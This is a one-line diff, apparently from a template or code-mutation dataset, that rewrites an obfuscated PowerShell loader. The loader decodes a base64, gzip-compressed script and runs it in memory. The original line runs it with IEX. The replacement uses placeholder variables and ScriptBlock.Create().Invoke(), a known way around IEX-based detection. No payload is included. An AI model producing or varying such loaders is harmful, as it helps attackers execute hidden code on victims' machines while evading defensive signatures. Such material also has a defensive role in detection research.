@@ -1,1 +1,1 @@
-$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("[BASE64]".Replace("!", "A")));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
+$VAR1 = New-Object IO.MemoryStream(,[Convert]::FromBase64String("[BASE64]".Replace("!", "[CHAR]"))); $VAR2 = (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($VAR1,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd(); [ScriptBlock]::Create($VAR2).Invoke()
